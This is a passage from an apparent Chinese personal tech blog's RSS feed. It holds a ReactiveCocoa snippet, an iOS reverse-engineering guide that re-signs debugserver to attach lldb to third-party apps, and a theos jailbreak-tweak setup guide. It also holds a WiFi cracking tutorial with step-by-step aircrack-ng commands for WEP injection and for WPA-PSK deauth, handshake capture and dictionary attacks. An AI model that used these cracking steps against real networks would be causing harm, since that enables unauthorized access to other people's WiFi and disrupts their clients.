&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[tfRac doNext:^(id x) {
    	NSLog(@&quot;附加操作&quot;);
    }] subscribeNext:^(id x) {

    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;参考资料&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/tangchangjiang/p/5598079.html&quot;&gt;ReactiveCocoa - 基础篇&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://benbeng.leanote.com/post/ReactiveCocoaTutorial-part1&quot;&gt;ReactiveCocoa入门教程——第一部分&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://benbeng.leanote.com/post/ReactiveCocoaTutorial-part2&quot;&gt;ReactiveCocoa入门教程——第二部分&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/87ef6720a096&quot;&gt;最快让你上手ReactiveCocoa之基础篇&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/e10e5ca413b7&quot;&gt;最快让你上手ReactiveCocoa之进阶篇&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 18 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/01/18/ReactiveCocoa%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/01/18/ReactiveCocoa%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</guid>
        
        <category>开发</category>
        
        
      </item>
    
      <item>
        <title>lldb调试第三方App</title>
        <description>&lt;p&gt;在iOS逆向工程中，通过class-dump能得到函数头文件，但是一般情况下，参数都是&lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;类型，这时候可以通过调试器打印出来看一下，起到事半功倍的作用。&lt;/p&gt;

&lt;h2 id=&quot;debugserver&quot;&gt;debugserver&lt;/h2&gt;

&lt;p&gt;在连接过&lt;code class=&quot;highlighter-rouge&quot;&gt;XCode&lt;/code&gt;后，XCode会自动给手机安装上&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;是安装在手机端用于接受电脑端传过去的&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;命令的。执行后再把结果返回给&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;。
在正常的开发中，&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;是没有&lt;code class=&quot;highlighter-rouge&quot;&gt;task_for_pid&lt;/code&gt;的权限的，所以一般只能调试我们自己的App。但是这样对越狱开发一点用都没有了。但是通过配置我们可以提升&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;的权限。&lt;/p&gt;

&lt;h2 id=&quot;配置debugserver&quot;&gt;配置debugserver&lt;/h2&gt;

&lt;h3 id=&quot;debugserver减肥&quot;&gt;debugserver减肥&lt;/h3&gt;

&lt;p&gt;首先将debugserver拷贝到电脑中。命令是&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp root@(手机的ip地址):/Developer/usr/bin/debugserver (要拷贝到的路径)/debugderver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd debugderver文件的路径
lipo -thin arm64 debugserver -output debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;下载&lt;a href=&quot;http://iosre.com/ent.xml&quot;&gt;http://iosre.com/ent.xml&lt;/a&gt;这个文件放到debugderver文件所在的路径。
执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/theos/bin/ldid -Sent.xml debugserver
-S后面是没有空格的
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果长时间没有执行完毕，就只能用另一种方案了。
下载&lt;a href=&quot;http://iosre.com/ent.plist&quot;&gt;http://iosre.com/ent.plist&lt;/a&gt;这个文件
执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -s - --entitlements ent.plist -f debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后把修改过的debugserver拷贝回iOS&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp (debugserver的地址)/debugserver root@192.168.5.228:/usr/bin/debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;debugserver我们放在/usr/bin里面可以直接输入debugserver运行。&lt;/p&gt;

&lt;p&gt;ssh连接手机，提升权限&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod +x /usr/bin/debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;打开调试器&quot;&gt;打开调试器&lt;/h2&gt;

&lt;h3 id=&quot;手机端&quot;&gt;手机端&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;debugserver -x backboard *:1234 /Applications/MobileSMS.app
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这句话表示，打开短信，并且注入调试器。等待来自任意ip的1234端口的&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;连接&lt;/p&gt;

&lt;h3 id=&quot;电脑端&quot;&gt;电脑端&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Applications/Xcode.app/Contents/Developer/usr/bin/lldb
process connect connect://192.168.5.228:1234
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样就可以连上了。连接成功后
如果连接上是卡住的状态，好像是连接上回默认被断点卡住，lldb输入c命令就能好。&lt;/p&gt;
</description>
        <pubDate>Thu, 05 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/01/05/lldb%E5%92%8Cdebugserver%E8%B0%83%E8%AF%95/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/01/05/lldb%E5%92%8Cdebugserver%E8%B0%83%E8%AF%95/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>Mac下的WIFI破解</title>
        <description>&lt;p&gt;以前破wifi用的是CDLinux下的工具，最近换了mac研究了一下mac下的wifi破解工具，速度还行。不过现在到处都是免费wifi，还有好用的万能钥匙，这些技术用的都比较少了，写下来备用吧。&lt;/p&gt;

&lt;h2 id=&quot;一wep破解&quot;&gt;一、wep破解&lt;/h2&gt;

&lt;h3 id=&quot;1载入无线网卡&quot;&gt;1、载入无线网卡&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig -a查看网卡
ifconfig wlan0 up加载网卡
iwconfig只查看无线网卡
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;2激活无线网卡只monitor监听模式&quot;&gt;2、激活无线网卡只monitor监听模式&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airmon-ng start 上面查看的网卡名

monitor mode enabled on mon0便是已启动监听模式，监听模式下适配器名称变更为mon0。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;3探测无线网络抓取无线数据包&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡

airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
参数解释：
--ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
-c 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；
-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;4对目标ap使用arprequest注入攻击加速数据包的获取&quot;&gt;4、对目标AP使用ArpRequest注入攻击，加速数据包的获取&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
参数解释：
-3 指采用ARPRequesr注入攻击模式；
-b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
-h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；
最后跟上无线网卡的名称，这里就是mon0啦。
在等待片刻之后，一旦成功截获到ARP请求报文，我们将会看到如下图13所示的大量ARP报文快速交互的情况出现。
此时回到airodump-ng 会看到packets栏的数字在飞速递增。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;5打开aircrack-ng开始破解wep&quot;&gt;5、打开aircrack-ng，开始破解WEP&lt;/h3&gt;

&lt;p&gt;在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功就等待数据报文的继续抓取然后多试几次。注意，此处不需要将进行注入攻击的Shell关闭，而是另外开一个Shell进行同步破解。输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng 捕获的ivs文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;二wap-psk破解&quot;&gt;二、wap-psk破解&lt;/h2&gt;

&lt;h3 id=&quot;1升级aircrack-ng&quot;&gt;1、升级Aircrack-ng&lt;/h3&gt;

&lt;p&gt;最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng-oui-update
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;2载入并激活无线网卡至monitor即监听模式&quot;&gt;2、载入并激活无线网卡至monitor即监听模式&lt;/h3&gt;

&lt;p&gt;载入无线网卡的顺序及命令部分，依次输入下述命令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;startx            进入到图形界面
ifconfig –a       查看无线网卡状态
ifconfig  wlan0  up     载入无线网卡驱动
airmon-ng  start  wlan0  激活网卡到monitor模式
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;3探测无线网络抓取无线数据包-1&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng -c 6 –w longas mon0
参数解释：
-c 这里我们设置目标AP的工作频道，通过观察，我们要进行攻击测试的无线路由器工作频道为6；
-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，这里我就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longas.cap，而是longas-01.cap。
mon0 为之前已经载入并激活监听模式的无线网卡。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;4进行deauth攻击加速破解过程&quot;&gt;4、进行Deauth攻击加速破解过程&lt;/h3&gt;

&lt;p&gt;和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
参数解释：
-0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等；
-a 后跟AP的MAC地址；
-c 后跟客户端的MAC地址；
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;5开始破解wpa-psk&quot;&gt;5、开始破解WPA-PSK&lt;/h3&gt;

&lt;p&gt;在成功获取到无线WPA-PSK验证数据报文后，就可以开始破解，输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w dic 捕获的cap文件 
-w 后跟预先制作的字典，这里是BT4下默认携带的字典。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;命令合集&quot;&gt;命令合集&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng
主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
airmon-ng
用于改变无线网卡工作模式，以便其他工具的顺利使用
airodump-ng
用于捕获802.11数据报文，以便于aircrack-ng破解
aireplay-ng
在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量
airserv-ng
可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备
airolib-ng
进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件
airdecap-ng
用于解开处于加密状态的数据包
tools
其他用于辅助的工具，如airdriver-ng、packetforge-ng等
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;破解wifi密码总结&quot;&gt;破解WIFI密码总结&lt;/h1&gt;

&lt;p&gt;这里我总结一下常用的流程，其实只有3个步骤。&lt;/p&gt;

&lt;h3 id=&quot;获取搜索到的wifi&quot;&gt;获取搜索到的wifi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airport -s
SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开始监听&quot;&gt;开始监听&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport en0 sniff 1
en0是网卡   1是要抓包的信道
抓包.cap文件默认保存在/tmp  -w可以改变保存路径
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;解析&quot;&gt;解析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w 1.txt 1.cap
1.txt是字典暴  1.cap是抓包文件
可以看到cap包的内容，Encryption中（0 handshake）是抓包失败，（1 handshake）则是抓包成功。
记住成功的行数，Index number of target network ?后面输入行数，回车。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 29 Dec 2016 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>theos越狱环境搭建</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/theos/theos/wiki/Installation&quot;&gt;参考文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/YasinTian/TheosFirstDemo/tree/master&quot;&gt;demo在这里&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ldid安装&quot;&gt;ldid安装&lt;/h2&gt;

&lt;p&gt;ldid可以在http://joedj.net/ldid 下载
复制到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin&lt;/code&gt;里面
执行&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo chmod 777 /opt/theos/bin/ldid&lt;/code&gt;提升权限&lt;/p&gt;

&lt;h2 id=&quot;libsubstratedylib&quot;&gt;libsubstrate.dylib&lt;/h2&gt;

&lt;p&gt;这个需要用到手机助手的文件管理功能把&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate&lt;/code&gt;复制出来
改名为&lt;code class=&quot;highlighter-rouge&quot;&gt;libsubstrate.dylib&lt;/code&gt;，然后放到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/lib&lt;/code&gt; 中。&lt;/p&gt;

&lt;h2 id=&quot;dkpg安装&quot;&gt;dkpg安装&lt;/h2&gt;

&lt;p&gt;这个命令需要安装&lt;a href=&quot;https://www.macports.org/install.php&quot;&gt;MacPorts&lt;/a&gt;，选择对应的系统下下来安装即可。
&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo port install dpkg&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;theos安装&quot;&gt;theos安装&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /opt
$ git clone --recursive https://github.com/theos/theos.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~./bash_profile&lt;/code&gt;中加入下面的代码，没有这文件就创建一个
&lt;code class=&quot;highlighter-rouge&quot;&gt;export THEOS=/opt/theos&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/opt/theos/bin/:$PATH&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;测试一下&quot;&gt;测试一下&lt;/h2&gt;

&lt;p&gt;cd到准备放工程的目录执行&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin/nic.pl&lt;/code&gt;能输入输出下面的选项，theos就配置好了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ /opt/theos/bin/nic.pl
NIC 2.0 - New Instance Creator
------------------------------
  [1.] iphone/activator_event
  [2.] iphone/application_modern
  [3.] iphone/cydget
  [4.] iphone/flipswitch_switch
  [5.] iphone/framework
  [6.] iphone/ios7_notification_center_widget
  [7.] iphone/library
  [8.] iphone/notification_center_widget
  [9.] iphone/preference_bundle_modern
  [10.] iphone/tool
  [11.] iphone/tweak
  [12.] iphone/xpc_service
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;运行&quot;&gt;运行&lt;/h2&gt;

&lt;p&gt;选择&lt;code class=&quot;highlighter-rouge&quot;&gt;iphone/tweak&lt;/code&gt;这个选项，输入11回车。
会让你输入工程名，bundleId，目标bundleId等。这里呢，我们只是要运行一下demo测试环境搭建是否成功，把工程名输了，其他直接回车就行了，都是有默认的。
打开工程目录下的&lt;code class=&quot;highlighter-rouge&quot;&gt;Makefile&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include $(THEOS)/makefiles/common.mk
TWEAK_NAME = firstdemo
firstdemo_FILES = Tweak.xm
include $(THEOS_MAKE_PATH)/tweak.mk
THEOS_DEVICE_IP = 192.168.2.157	#手机的ip地址
iOSRE_FRAMEWORKS=UIKit Foundation	#导入的库
ARCHS = arm64 #手机是64位还是32位
after-install::
	install.exec &quot;killall -9 SpringBoard&quot;	#在安装成功后杀掉SpringBoard，会从新启动以加载我们的插件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;打开工程目录下的&lt;code class=&quot;highlighter-rouge&quot;&gt;Tweak.xm&lt;/code&gt;文件
粘贴下面的代码&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;UIKit/UIKit.h&amp;gt;
#import &amp;lt;SpringBoard/SpringBoard.h&amp;gt;

%hook SBLockScreenDateViewController
- (void)setCustomSubtitleText:(id)arg1 withColor:(id)arg2
{
NSString *str = @&quot;锁屏界面的日期文字变成了这段话!&quot;;
%orig(str, arg2);
}
%end

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt;编译&lt;code class=&quot;highlighter-rouge&quot;&gt;make package&lt;/code&gt;打包&lt;code class=&quot;highlighter-rouge&quot;&gt;make install&lt;/code&gt;安装，过程会叫你输入2次ssh密码,全部成功的话，你就会看到SpringBoard正在重启。重启之后锁屏界面的日期，变成了我们自定义的字符串。
如果提示THEOS_DEVICE_IP错误之类的就先输入&lt;code class=&quot;highlighter-rouge&quot;&gt;export THEOS_DEVICE_IP=手机的ip地址&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;theos的升级&quot;&gt;theos的升级&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git submodule update –recursive&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;注意&quot;&gt;注意&lt;/h2&gt;

&lt;p&gt;在一些老板的安装方法中有&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /opt/theos/bin/bootstrap.sh substrate&lt;/code&gt;,现在可以不用管了。&lt;/p&gt;
</description>
        <pubDate>Thu, 29 Dec 2016 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</link>
        <guid isPermaLink="true">http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</guid>
        
        <category>安全</category>
        
        
      </item>
    
  </channel>
</rss>
